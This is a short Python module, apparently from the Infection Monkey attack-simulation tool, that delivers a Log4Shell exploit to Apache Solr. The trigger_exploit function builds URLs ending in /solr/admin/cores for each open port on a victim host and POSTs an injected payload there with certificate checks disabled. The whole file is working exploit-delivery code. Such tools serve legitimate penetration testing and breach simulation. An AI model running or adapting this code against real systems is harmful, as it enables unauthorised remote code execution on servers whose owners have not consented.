from logging import getLogger
from typing import List

import requests

from infection_monkey.model import VictimHost

logger = getLogger(__name__)


def trigger_exploit(payload: str, host: VictimHost, open_ports: List[int]):
    urls = build_urls(open_ports, host)
    payload = {"foo": payload}
    for url in urls:
        try:
            resp = requests.post(url, data=payload, timeout=5, verify=False)  # noqa DUO123
        except requests.ReadTimeout as e:
            logger.debug(f"Log4shell request failed {e}")


def build_urls(open_ports: List[int], host: VictimHost) -> List[str]:
    urls = []
    for port in open_ports:
        urls.append(f"http://{host.ip_addr}:{port}/solr/admin/cores")
    return urls
